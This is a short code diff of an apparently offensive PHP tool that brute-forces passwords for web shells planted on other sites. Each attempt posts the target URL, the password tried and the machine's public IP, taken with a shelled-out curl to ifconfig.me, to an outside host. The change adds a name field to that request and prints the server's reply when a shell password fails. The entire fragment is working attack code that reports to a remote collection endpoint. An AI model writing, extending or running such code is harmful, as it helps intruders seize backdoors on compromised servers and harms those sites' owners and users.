@@ -103,7 +103,7 @@ function crotz($x)
                     curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                     curl_setopt($ch, CURLOPT_POST, 1);
-                    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $pass . "&ip=" . exec("curl -s ifconfig.me"));
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $pass . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type[1]);
                     $exe = curl_exec($ch);
                     $results = json_decode($exe);
 
@@ -118,6 +118,7 @@ function crotz($x)
                         $end = fopen("shell_die.txt", "a+");
                         fwrite($end, "\n[DIE] Shell at " . $x);
                         print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
+                        print $exe;
                         fclose($end);
                     }
                 }
